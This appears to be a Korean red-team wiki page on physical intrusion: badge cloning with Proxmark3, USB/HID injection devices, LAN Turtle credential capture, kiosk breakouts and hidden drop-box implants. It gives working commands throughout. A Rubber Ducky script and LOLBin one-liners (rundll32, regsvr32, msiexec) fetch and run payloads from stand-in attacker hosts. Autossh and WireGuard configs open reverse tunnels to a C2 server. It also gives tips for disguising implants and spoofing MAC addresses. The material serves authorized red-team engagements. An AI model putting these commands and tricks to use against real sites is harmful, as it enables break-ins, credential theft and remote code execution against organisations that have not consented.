# 물리 침투 / KIOSK / 하드웨어

!!! abstract "개요"
    레드팀 서비스 스코프에는 **물리 침투**가 포함되는 경우가 많다.  
    회사 1층 로비, 안내 데스크 PC, KIOSK 단말, 주차장 AP, USB 드랍 등이 대상.

---

## 일반적인 물리 침투 플로우

```mermaid
flowchart LR
    A[외부 정찰\n건물/출입통제] --> B[Pretext 설정\n배달원/외주/청소]
    B --> C[Tailgating/출입증 복제]
    C --> D[내부 네트워크 드랍]
    D --> E[Implant 장치\nLAN Turtle/RPi]
    E --> F[원격 C2]
```

---

## Tailgating / 출입증 복제

### HID / RFID 복제

```bash
# Proxmark3 (125kHz / 13.56MHz 모두 지원)
pm3> hf search                          # 카드 종류 자동 탐지
pm3> lf hid read                        # HID Prox 카드 읽기
pm3> lf hid sim -r 2006ec0c86           # 읽은 값 시뮬레이션(에뮬레이트)
pm3> lf hid clone -r 2006ec0c86         # 공카드에 복제

# MIFARE Classic (13.56MHz)
pm3> hf mf autopwn                      # 기본 키 자동 덤프
```

- **ESPKey**: 출입 통제기의 Wiegand 라인(D0/D1)에 인라인 장착 → 지나가는 카드 값 전부 수집.
- **Long-range HID reader**: 가방 안에 숨긴 long-range reader 로 1~2m 거리에서 피해자 배지 복제.

---

## USB / HID Injection

| 장치 | 특징 |
|---|---|
| Rubber Ducky | HID 키보드로 인식 → 사전 정의된 키 입력 자동 실행 |
| Bash Bunny | Ducky + storage + network adapter → 자격증명 탈취 자동화 |
| O.MG Cable | 충전 케이블 위장, WiFi로 원격 페이로드 삽입 |
| Evil Crow Cable | O.MG 오픈소스 대안 |
| LAN Turtle | USB-Ethernet 어댑터 위장 → NAC 환경에서 QuickCreds 공격 |

```
// Rubber Ducky 스크립트 예시 (PowerShell 원격 로더 실행)
DELAY 2000
GUI r
DELAY 500
STRING powershell -nop -w hidden -c "iex(iwr http://atk/a.ps1 -UseBasicParsing)"
ENTER
```

---

## LAN Turtle / Packet Squirrel / Responder 자동화

```bash
# QuickCreds 모듈 (LAN Turtle)
# 1. 공격자 LAN Turtle을 잠금 상태 PC에 꽂음
# 2. Windows가 "새 이더넷 어댑터" 감지
# 3. DHCP로 게이트웨이 변조
# 4. Responder로 NetNTLMv2 hash 수집
# 5. 2~3분 후 뽑고 철수
```

!!! warning "OPSEC"
    잠금 상태 Windows 도 새 NIC 에 대해 **자동 DNS/WPAD 쿼리**를 생성한다. 따라서 로그인하지 않고도 NetNTLMv2 해시를 뺄 수 있음. EDR 에는 거의 기록되지 않지만 Windows Event 6416(new device enumeration)에 남는다.

---

## KIOSK / 로비 단말 탈출

- **Shift 5번 (Sticky Keys)**: `C:\Windows\System32\sethc.exe` 를 `cmd.exe` 로 교체 (BitLocker 없는 경우 부팅 USB로 가능)
- **파일 다이얼로그 / Open / Save**: `cmd.exe`, `powershell.exe` 경로 직접 타이핑 → 셸 실행
- **Help / Print / Properties 우회**:
  - Internet Explorer 기반 KIOSK: `F1` → help → `Jump to URL` → `file:///C:/windows/system32/cmd.exe`
  - Explorer 주소창: `explorer.exe` 주소창에 `powershell.exe` 직접 타이핑
- **Adobe Reader**: 문서 내 `javascript:` URI 로 JS 실행, `app.launchURL()` 악용
- **Citrix/Published App**: `ctrl+p` → 프린터 설정 → 파일 추가 → `cmd.exe`

```powershell
# AppLocker/UAC가 제한되어 있어도 쓸 수 있는 LOLBins
rundll32.exe url.dll,FileProtocolHandler \\attacker\share\payload.exe
regsvr32.exe /s /n /u /i:http://atk/payload.sct scrobj.dll
msiexec /q /i http://atk/payload.msi
```

---

## WiFi / 주차장 공격 연계

1. 타겟 건물 주차장에서 **게스트 AP / 회사 AP** 감청 → [무선 공격](../wireless/index.md)
2. 내부 AP 입장 시 바로 responder / mitm6 기동
3. Assumed Breach 와 유사하게 "내부망 진입" 달성

---

## Drop Box 구축 (원격 Implant)

```bash
# Raspberry Pi 4 + LTE 모뎀
# 1. 역방향 SSH 터널 (C2로)
autossh -f -N -R 2222:localhost:22 redteam@c2.example.com

# 2. Wireguard 터널 (안정적)
# /etc/wireguard/wg0.conf
[Interface]
PrivateKey = ...
[Peer]
PublicKey = ...
Endpoint = c2.example.com:51820
AllowedIPs = 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
PersistentKeepalive = 25

# 3. 내부망 정찰은 전부 C2 측에서 터널 통해 수행
```

- Drop Box 발각 대비: 외관을 평범한 **HDMI 캡처 장비 / 회의실 콘솔 / 전원 스트립** 으로 위장.
- 전원 케이블 뽑혀도 자동 재접속: `autossh` + `systemd Restart=always`.

---

## OPSEC 체크리스트

- [ ] 복장은 타겟 회사 외주/업체 작업복 (배달, 청소, 통신사 기사)
- [ ] 복제된 배지에는 회사 로고/이름 인쇄 (다소 떨어져 있어도 위화감 최소)
- [ ] 드랍박스 MAC은 해당 회사에서 사용하는 장비 OUI 로 위조
- [ ] 철수 경로 미리 정찰, 모든 장비에 식별표(레드팀 라벨) 부착 (발각 시 즉시 증명)

---

## 참고

- 관련: [무선 공격](../wireless/index.md), [내부 정찰](../lifecycle/enumeration.md)
- Implant 자동화: [C2 인프라](../infra/c2.md)
